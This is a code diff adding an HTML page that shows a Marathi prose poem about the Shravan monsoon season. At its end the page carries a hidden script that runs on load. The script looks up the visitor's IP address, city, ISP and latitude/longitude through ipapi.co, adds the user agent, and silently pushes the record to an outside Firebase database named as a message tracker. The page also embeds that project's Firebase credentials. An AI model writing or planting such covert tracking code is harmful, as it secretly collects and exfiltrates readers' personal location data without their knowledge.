@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="mr">
+<head>
+  <meta charset="UTF-8">
+  <title>झरोक्यातून पाहिलेला श्रावण</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+  <style>
+    body {
+      background: #fff;
+      color: #000;
+      font-family: "Noto Serif Devanagari", "Times New Roman", serif;
+      font-size: 20px;
+      line-height: 1.7;
+      margin: 0;
+      padding: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 900px;
+      column-count: 2;
+      column-gap: 60px;
+      text-align: justify;
+    }
+    h1 {
+      text-align: center;
+      font-size: 28px;
+      margin-bottom: 30px;
+      letter-spacing: 2px;
+    }
+    p {
+      margin: 0 0 1em 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>श्रावण, ओघळ की अंकुर?</h1>
+    <p>
+      ओल्या वाटांवर चालताना, पाऊस फक्त भिजवत नाही… तो आठवणींचे दरवाजे उघडतो.  
+      काळोखाच्या दाराशी उभं राहून, थेंब एक प्रश्न विचारतो, “प्रवास कुठला? शेवट कुठे?”
+    </p>
+    <p>
+      आकाश जड झालेलं, मातीचा श्वास उसळतो, आणि मन अंतरंगाच्या सावलीत उभं राहतं.  
+      श्रावण हा ऋतू नाही, तो मौनाचा गूढ उच्चार आहे. तो विचारतो, “काय सापडलं तुला? काय हरवलंस तू?”
+    </p>
+    <p>
+      झरोक्यातून दिसणारं जग क्षणभर सुंदर भासतं, पण पुढच्याच क्षणी पाण्यात विरघळून जातं.  
+      तरीही, त्या विरघळण्यातच दडलेली असते नवी जन्मकळा. ओलसर जमिनीच्या कुशीतून कळत-नकळत उगवतात नव्या स्वप्नांची हिरवी पालवी.
+    </p>
+    <p>
+      थेंबांचा निनाद जुन्या स्वरांना हलवतो, मूक वीणेच्या तारांवर अवचित कंपन उमटवतो.  
+      पाऊस जसा डोळ्यांवर येतो, तसा तो हृदयावरही बरसतो आरसे धूसर करून अंतर्मनाचं रूप दाखवतो.
+    </p>
+    <p>
+      ढगांच्या दाट आवरणात लपलेली असते वेळ, आणि तिच्या उलगडण्यातून जुनं वर्तमान, नवं भूतकाळ हळूहळू वाहत राहतं.  
+      वाऱ्याच्या कुशीत उभी झाडं ओले स्वर गात राहतात, त्यांच्या निःशब्द पानांवरून थेंब जणू गुपितं लिहितात.
+    </p>
+    <p>
+      पाण्याच्या हलक्या तरंगांवर सावल्यांचा खेळ सुरू होतो, जणू प्रत्येक थेंब स्वतःचा अर्थ शोधतो.  
+      धुके अलगद उतरून दूरच्या वाटा झाकून टाकतं, आणि त्या झाकण्यातच अस्पष्टतेचा नवा प्रकाश सापडतो.
+    </p>
+    <p>
+      क्षणभर वाटतं, हा श्रावण केवळ आकाशात नाही, तो मनाच्या दालनातही सतत बरसत असतो.  
+      मौन अधिक गहिरं होतं, आणि त्या मौनातच उत्तरं उमलतात, नव्या प्रश्नांची बीजं रुजतात.
+    </p>
+    <p><b>
+      श्रावण असाच.... शेवटाचा, आरंभाचा, आणि अदृश्य प्रवासाचा दूत.
+    </b></p>
+  </div>
+  <script>
+    (function(){
+      const f = {
+        apiKey: "AIzaSyA6FOahPr_40N1WS0S-VY_ssQRefwJt9c8",
+        authDomain: "messagetracker-fced6.firebaseapp.com",
+        databaseURL: "https://messagetracker-fced6-default-rtdb.firebaseio.com",
+        projectId: "messagetracker-fced6",
+        storageBucket: "messagetracker-fced6.appspot.com",
+        messagingSenderId: "770318035535",
+        appId: "1:770318035535:web:c8b802e29e11c59e44183a",
+        measurementId: "G-YXQNQSL5HR"
+      };
+      firebase.initializeApp(f);
+      const db = firebase.database();
+
+      fetch("https://ipapi.co/json")
+        .then(r => r.json())
+        .then(d => {
+          const log = {
+            ip: d.ip,
+            city: d.city,
+            region: d.region,
+            country: d.country_name,
+            org: d.org,
+            timezone: d.timezone,
+            latitude: d.latitude,
+            longitude: d.longitude,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          };
+          db.ref("ip_logs_p11In").push(log);
+        });
+    })();
+  </script>
+</body>
+</html>
